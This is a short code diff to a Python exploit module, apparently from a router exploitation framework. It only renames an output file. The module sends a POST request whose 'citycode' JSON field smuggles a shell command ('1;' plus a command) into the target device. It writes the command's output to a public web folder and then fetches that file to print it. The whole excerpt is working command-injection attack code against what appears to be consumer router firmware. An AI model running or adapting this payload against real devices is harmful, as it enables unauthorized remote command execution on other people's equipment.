@@ -969,14 +969,14 @@ class Exploit(HTTPClient):
         cmd = "id"
         payload = (
             '{"weather":{"get_weather_observe":'
-            '{"citycode":"1;' + cmd + ' > /www/web-static/_rxf_out;",'
+            '{"citycode":"1;' + cmd + ' > /www/web-static/_exf_out;",'
             '"new_pwd":"a"}},"method":"do"}'
         )
         self.http_request(
             method="POST", path="/stok=AAAA/ds", data=payload,
             headers={"Content-Type": "application/json; charset=UTF-8"},
         )
-        r = self.http_request(method="GET", path="/web-static/_rxf_out")
+        r = self.http_request(method="GET", path="/web-static/_exf_out")
         if r and r.text.strip():
             print_success("Command output:")
             print_info(r.text.strip())
